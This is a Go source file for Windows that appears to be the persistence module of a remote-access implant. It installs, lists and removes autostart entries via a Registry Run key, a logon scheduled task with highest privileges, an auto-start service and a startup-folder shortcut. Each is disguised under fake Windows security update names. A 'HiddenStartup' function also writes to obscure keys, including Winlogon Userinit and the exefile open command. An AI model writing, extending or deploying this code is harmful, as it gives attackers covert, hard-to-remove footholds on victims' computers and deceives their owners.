//go:build windows
// +build windows

package main

import (
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"

	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/registry"
	"golang.org/x/sys/windows/svc"
	"golang.org/x/sys/windows/svc/mgr"
)

const (
	PersistMethodRegistry     = "registry"
	PersistMethodTask         = "task"
	PersistMethodService      = "service"
	PersistMethodStartupFolder = "startup"
)

// PersistenceInfo contains information about an installed persistence mechanism
type PersistenceInfo struct {
	Method      string `json:"method"`
	Location    string `json:"location"`
	Description string `json:"description"`
	Installed   bool   `json:"installed"`
}

// InstallPersistence installs persistence using the specified method
func (i *Implant) InstallPersistence(method string) ([]byte, error) {
	exePath, err := os.Executable()
	if err != nil {
		return nil, fmt.Errorf("failed to get executable path: %v", err)
	}

	var result PersistenceInfo
	result.Method = method

	switch method {
	case PersistMethodRegistry:
		err = i.installRegistryPersistence(exePath)
		result.Location = `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
		result.Description = "Registry Run key persistence"

	case PersistMethodTask:
		err = i.installScheduledTaskPersistence(exePath)
		result.Location = "Windows Task Scheduler"
		result.Description = "Scheduled task persistence"

	case PersistMethodService:
		err = i.installServicePersistence(exePath)
		result.Location = "Windows Service"
		result.Description = "Windows service persistence"

	case PersistMethodStartupFolder:
		err = i.installStartupFolderPersistence(exePath)
		result.Location = "Startup folder"
		result.Description = "Startup folder shortcut persistence"

	default:
		return nil, fmt.Errorf("unknown persistence method: %s", method)
	}

	if err != nil {
		result.Installed = false
		return json.Marshal(map[string]interface{}{
			"status": "error",
			"error":  err.Error(),
			"info":   result,
		})
	}

	result.Installed = true
	return json.Marshal(map[string]interface{}{
		"status": "success",
		"info":   result,
	})
}

// RemovePersistence removes persistence using the specified method
func (i *Implant) RemovePersistence(method string) ([]byte, error) {
	var err error

	switch method {
	case PersistMethodRegistry:
		err = i.removeRegistryPersistence()
	case PersistMethodTask:
		err = i.removeScheduledTaskPersistence()
	case PersistMethodService:
		err = i.removeServicePersistence()
	case PersistMethodStartupFolder:
		err = i.removeStartupFolderPersistence()
	default:
		return nil, fmt.Errorf("unknown persistence method: %s", method)
	}

	if err != nil {
		return json.Marshal(map[string]interface{}{
			"status": "error",
			"error":  err.Error(),
			"method": method,
		})
	}

	return json.Marshal(map[string]interface{}{
		"status": "success",
		"method": method,
	})
}

// ListPersistence lists all installed persistence mechanisms
func (i *Implant) ListPersistence() ([]byte, error) {
	mechanisms := []PersistenceInfo{
		i.checkRegistryPersistence(),
		i.checkScheduledTaskPersistence(),
		i.checkServicePersistence(),
		i.checkStartupFolderPersistence(),
	}

	return json.Marshal(map[string]interface{}{
		"persistence": mechanisms,
	})
}

// installRegistryPersistence installs registry run key persistence
func (i *Implant) installRegistryPersistence(exePath string) error {
	key, err := registry.OpenKey(registry.CURRENT_USER,
		`Software\Microsoft\Windows\CurrentVersion\Run`,
		registry.SET_VALUE)
	if err != nil {
		return fmt.Errorf("failed to open registry key: %v", err)
	}
	defer key.Close()

	// Use a legitimate-sounding name
	valueName := "WindowsSecurityUpdate"
	err = key.SetStringValue(valueName, exePath)
	if err != nil {
		return fmt.Errorf("failed to set registry value: %v", err)
	}

	return nil
}

// removeRegistryPersistence removes registry persistence
func (i *Implant) removeRegistryPersistence() error {
	key, err := registry.OpenKey(registry.CURRENT_USER,
		`Software\Microsoft\Windows\CurrentVersion\Run`,
		registry.SET_VALUE)
	if err != nil {
		return err
	}
	defer key.Close()

	return key.DeleteValue("WindowsSecurityUpdate")
}

// checkRegistryPersistence checks if registry persistence is installed
func (i *Implant) checkRegistryPersistence() PersistenceInfo {
	info := PersistenceInfo{
		Method:      PersistMethodRegistry,
		Location:    `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`,
		Description: "Registry Run key persistence",
		Installed:   false,
	}

	key, err := registry.OpenKey(registry.CURRENT_USER,
		`Software\Microsoft\Windows\CurrentVersion\Run`,
		registry.QUERY_VALUE)
	if err != nil {
		return info
	}
	defer key.Close()

	_, _, err = key.GetStringValue("WindowsSecurityUpdate")
	if err == nil {
		info.Installed = true
	}

	return info
}

// installScheduledTaskPersistence installs scheduled task persistence
func (i *Implant) installScheduledTaskPersistence(exePath string) error {
	// Use schtasks command to create task
	taskName := "WindowsSecurityUpdateTask"

	// Create task that runs at logon
	cmdArgs := []string{
		"/Create",
		"/SC", "ONLOGON",
		"/TN", taskName,
		"/TR", fmt.Sprintf(`"%s"`, exePath),
		"/RL", "HIGHEST",
		"/F", // Force creation, overwrite if exists
	}

	output, err := i.ExecuteShell("schtasks", cmdArgs)
	if err != nil {
		return fmt.Errorf("failed to create scheduled task: %v, output: %s", err, output)
	}

	return nil
}

// removeScheduledTaskPersistence removes scheduled task persistence
func (i *Implant) removeScheduledTaskPersistence() error {
	taskName := "WindowsSecurityUpdateTask"
	cmdArgs := []string{"/Delete", "/TN", taskName, "/F"}

	output, err := i.ExecuteShell("schtasks", cmdArgs)
	if err != nil {
		return fmt.Errorf("failed to delete scheduled task: %v, output: %s", err, output)
	}

	return nil
}

// checkScheduledTaskPersistence checks if scheduled task persistence is installed
func (i *Implant) checkScheduledTaskPersistence() PersistenceInfo {
	info := PersistenceInfo{
		Method:      PersistMethodTask,
		Location:    "Windows Task Scheduler",
		Description: "Scheduled task persistence",
		Installed:   false,
	}

	taskName := "WindowsSecurityUpdateTask"
	cmdArgs := []string{"/Query", "/TN", taskName}

	_, err := i.ExecuteShell("schtasks", cmdArgs)
	if err == nil {
		info.Installed = true
	}

	return info
}

// installServicePersistence installs Windows service persistence
func (i *Implant) installServicePersistence(exePath string) error {
	m, err := mgr.Connect()
	if err != nil {
		return fmt.Errorf("failed to connect to service manager: %v", err)
	}
	defer m.Disconnect()

	serviceName := "WindowsSecurityService"
	s, err := m.OpenService(serviceName)
	if err == nil {
		s.Close()
		return fmt.Errorf("service already exists")
	}

	s, err = m.CreateService(serviceName, exePath, mgr.Config{
		DisplayName: "Windows Security Update Service",
		Description: "Manages Windows security updates and patches",
		StartType:   mgr.StartAutomatic,
	})
	if err != nil {
		return fmt.Errorf("failed to create service: %v", err)
	}
	defer s.Close()

	// Start the service
	err = s.Start()
	if err != nil && err != windows.ERROR_SERVICE_ALREADY_RUNNING {
		// Service might not start immediately, that's okay
	}

	return nil
}

// removeServicePersistence removes Windows service persistence
func (i *Implant) removeServicePersistence() error {
	m, err := mgr.Connect()
	if err != nil {
		return err
	}
	defer m.Disconnect()

	serviceName := "WindowsSecurityService"
	s, err := m.OpenService(serviceName)
	if err != nil {
		return err
	}
	defer s.Close()

	// Stop the service first
	s.Control(svc.Stop)

	// Delete the service
	return s.Delete()
}

// checkServicePersistence checks if service persistence is installed
func (i *Implant) checkServicePersistence() PersistenceInfo {
	info := PersistenceInfo{
		Method:      PersistMethodService,
		Location:    "Windows Service",
		Description: "Windows service persistence",
		Installed:   false,
	}

	m, err := mgr.Connect()
	if err != nil {
		return info
	}
	defer m.Disconnect()

	serviceName := "WindowsSecurityService"
	s, err := m.OpenService(serviceName)
	if err == nil {
		s.Close()
		info.Installed = true
	}

	return info
}

// installStartupFolderPersistence installs startup folder persistence
func (i *Implant) installStartupFolderPersistence(exePath string) error {
	// Get startup folder path
	startupPath := filepath.Join(os.Getenv("APPDATA"),
		`Microsoft\Windows\Start Menu\Programs\Startup`)

	// Create shortcut file
	lnkPath := filepath.Join(startupPath, "WindowsUpdate.lnk")

	// Use PowerShell to create shortcut
	psScript := fmt.Sprintf(`
		$WshShell = New-Object -comObject WScript.Shell
		$Shortcut = $WshShell.CreateShortcut('%s')
		$Shortcut.TargetPath = '%s'
		$Shortcut.Save()
	`, lnkPath, exePath)

	output, err := i.ExecutePowerShell(psScript)
	if err != nil {
		return fmt.Errorf("failed to create startup shortcut: %v, output: %s", err, output)
	}

	return nil
}

// removeStartupFolderPersistence removes startup folder persistence
func (i *Implant) removeStartupFolderPersistence() error {
	startupPath := filepath.Join(os.Getenv("APPDATA"),
		`Microsoft\Windows\Start Menu\Programs\Startup`)
	lnkPath := filepath.Join(startupPath, "WindowsUpdate.lnk")

	return os.Remove(lnkPath)
}

// checkStartupFolderPersistence checks if startup folder persistence is installed
func (i *Implant) checkStartupFolderPersistence() PersistenceInfo {
	info := PersistenceInfo{
		Method:      PersistMethodStartupFolder,
		Location:    "Startup folder",
		Description: "Startup folder shortcut persistence",
		Installed:   false,
	}

	startupPath := filepath.Join(os.Getenv("APPDATA"),
		`Microsoft\Windows\Start Menu\Programs\Startup`)
	lnkPath := filepath.Join(startupPath, "WindowsUpdate.lnk")

	if _, err := os.Stat(lnkPath); err == nil {
		info.Installed = true
	}

	return info
}

// HiddenStartup creates a hidden registry entry for persistence
func (i *Implant) HiddenStartup(exePath string) error {
	// Use less obvious registry locations
	hiddenKeys := []string{
		`Software\Microsoft\Windows\CurrentVersion\RunOnce`,
		`Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit`,
		`Software\Classes\exefile\shell\open\command`,
	}

	for _, keyPath := range hiddenKeys {
		key, err := registry.OpenKey(registry.CURRENT_USER, keyPath, registry.SET_VALUE)
		if err != nil {
			continue
		}

		err = key.SetStringValue("WindowsUpdate", exePath)
		key.Close()

		if err == nil {
			return nil
		}
	}

	return fmt.Errorf("failed to install hidden persistence")
}
